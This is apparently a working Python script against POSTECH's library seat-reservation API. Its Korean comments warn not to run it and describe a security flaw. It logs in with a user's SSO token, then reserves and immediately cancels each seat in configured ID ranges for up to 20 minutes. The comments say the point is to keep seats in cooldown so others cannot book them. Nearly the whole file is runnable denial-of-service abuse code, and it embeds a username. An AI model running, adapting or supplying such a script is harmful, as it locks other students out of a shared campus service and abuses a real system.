# 이 코드를 돌리지 마세요.
# 현재 도서관 시스템에 매우 큰 보안문제가 있습니다.


# 지정 ID 범위의 좌석예약을 방해합니다.
# 예약과 취소를 반복하여 좌석의 쿨타임을 계속 발동시키는 방식입니다.

# 플로라 4층 : seat_id : 879 - 900
# 아트리움 4층 : seat_id : 1037 - 1076


from datetime import date

if date.today() > date(2026, 4, 20):
    print("Script expired. Exiting.")
    exit()




import requests
import time
import os

# ============================================================
# CONFIGURATION — edit these if needed
# ============================================================

USER_NAME = "michael1209"
BASE_URL = "https://zzim.postech.ac.kr/smufu-api/api"
ROOM_ID = 6        # Plora 4층
STARTING_SEAT_ID = 565
ENDING_SEAT_ID = 1116
MAX_TIME = 1200 #total time spent hijacking in seconds
RETRY_DELAY = 0.2    # seconds between retries
RETURN_DELAY = 0

# ============================================================
# STEP 1 — LOGIN
# ============================================================

def login(session, pni_token):
    print("\n[1] Logging in...")
    sso_url = (
        f"https://zzim.postech.ac.kr/smufu-api/sso-login"
        f"?isMobile=N&autoLogin=N&authInfo={USER_NAME}&pniToken={pni_token}"
    )

    # Follow redirects
    r = session.get(sso_url, allow_redirects=True)
    final_url = r.url

    # Extract access token from the final URL
    # Final URL looks like: /#/sso-login/S_xxxxx?autoLogin=N&pniToken=...
    token = None
    if "/sso-login/" in final_url:
        after = final_url.split("/sso-login/")[1]
        token = after.split("?")[0]

    if token and token.startswith("S_"):
        print(f"    v SSO login successful (token: {token[:12]}...)")

        # Validate using the correct header name found in the site's JS config
        session.headers.update({"pyxis-Auth-Token": token})
        r2 = session.get(f"{BASE_URL}/validate")
        data = r2.json()
        if data.get("success"):
            name = data["data"]["name"]
            # Use the fresh accessToken returned by validate for all further requests
            fresh_token = data["data"].get("accessToken", token)
            session.headers.update({"pyxis-Auth-Token": fresh_token})
            print(f"    v Logged in as {name}")
            return True

        print(f"    x Authentication failed: {data.get('message')} (code: {data.get('code')})")
        return False
    else:
        print(f"    x Could not extract token from URL: {final_url}")
        return False

# ============================================================
# STEP 2 — CHECK IF ALREADY RESERVED
# ============================================================

def get_my_reservation(session):
    print("\n[2] Checking current reservation...")
    r = session.get(f"{BASE_URL}/pc/my-ticket")
    data = r.json()
    if data.get("success") and data["data"]["totalCount"] > 0:
        ticket = data["data"]["list"][0]
        seat_code = ticket["seat"]["code"]
        reservation_id = ticket["id"]
        state = ticket["seatCirculationState"]["code"]
        print(f"    v Found reservation -- Seat {seat_code}, ID: {reservation_id}, State: {state}")
        return reservation_id, seat_code, state
    else:   
        print("    v No current reservation found")
        return None, None, None

# ============================================================
# STEP 3 — CANCEL RESERVATION
# ============================================================

def cancel_reservation(session, reservation_id, state):
    print(f"\n[3] Cancelling reservation {reservation_id} (state: {state})...")
    endpoint = "cancel" if state == "TEMP_CHARGE" else "return"
    r = session.post(f"{BASE_URL}/pc/seat-charge/{reservation_id}/{endpoint}")
    data = r.json()
    if data.get("success"):
        print("    v Reservation cancelled successfully")
        return True
    else:
        print(f"    x Failed to cancel: {data.get('message')}")
        return False

# ============================================================
# STEP 4 — CHECK IF SEAT IS AVAILABLE
# ============================================================

def is_seat_available(session, seat_id):
    r = session.get(f"{BASE_URL}/pc/rooms-at-seat/{ROOM_ID}/seats")
    data = r.json()
    if data.get("success"):
        seat = data["data"].get(seat_id)
        if seat:
            return seat["isAvailable"]
    return False

# ============================================================
# STEP 5 — RESERVE SEAT
# ============================================================

def reserve_seat(session, seat_id):
    print(f"\n[4] Reserving seat {seat_id} (id={seat_id})...")
    try:
        r = session.post(f"{BASE_URL}/pc/seats/{seat_id}/charge-temporarily")
        data = r.json()
    except Exception as e:
        print(f"    x Request error: {e}")
        return False
    if data.get("success"):
        new_id = data["data"]["id"]
        state = data["data"]["seatCirculationState"]["code"]
        begin = data["data"]["beginTime"]
        end = data["data"]["endTime"]
        print(f"    v Reservation successful!")
        print(f"      Reservation ID : {new_id}")
        print(f"      State          : {state}")
        print(f"      Begin          : {begin}")
        print(f"      End            : {end}")
        return True
    else:
        print(f"    x Reservation failed: {data.get('message')} ({data.get('code')})")
        return False

# ============================================================
# MAIN
# ============================================================

def main():
    print("=" * 50)
    print("  POSTECH Library Auto-Reservation Script")
    print("=" * 50)

    pni_token = os.environ.get("PNI_TOKEN")
    if not pni_token:
        token_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pniToken.txt")
        if os.path.exists(token_file):
            with open(token_file) as f:
                pni_token = f.read().strip()
            print(f"\nLoaded pniToken from pniToken.txt")
        else:
            pni_token = input("\nPaste your pniToken here:\n> ").strip()

    if not pni_token:
        print("No token provided. Exiting.")
        return

    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0",
        "Accept": "application/json"
    })

    # Step 1 - Login
    if not login(session, pni_token):
        print("\nLogin failed. Please get a fresh pniToken and try again.")
        return

    # Step 2 - Check existing reservation
    reservation_id, seat_code, state = get_my_reservation(session)

    # Step 3 - Cancel if already reserved
    if reservation_id:
        print(f"\n    Seat {seat_code} is currently reserved by you.")
        cancelled = cancel_reservation(session, reservation_id, state)
        if not cancelled:
            print("\nCould not cancel existing reservation. Exiting.")
            return
        print("    Waiting for seat to reset after cancellation...")
        time.sleep(0.01)
        # 0.01s surely should be enough...

    # Step 4 & 5 - Reserve seat with retries

    start = time.time()
    while (time.time() - start < MAX_TIME):
        for seat_id in range(STARTING_SEAT_ID, ENDING_SEAT_ID + 1):
            print(f"\n[3] Attempting to reserve seat {seat_id}")
            
            if reserve_seat(session, seat_id):
                print("\n" + "=" * 50)
                print(f"  SUCCESS -- Seat {seat_id} reserved!")
                print("=" * 50)
                time.sleep(RETURN_DELAY)
                reservation_id, seat_code, state = get_my_reservation(session)
                cancel_reservation(session, reservation_id, "TEMP_CHARGE")

    print("\n" + "=" * 50)
    print("  FAILED -- Could not reserve seat after all attempts.")
    print("=" * 50)

if __name__ == "__main__":
    main()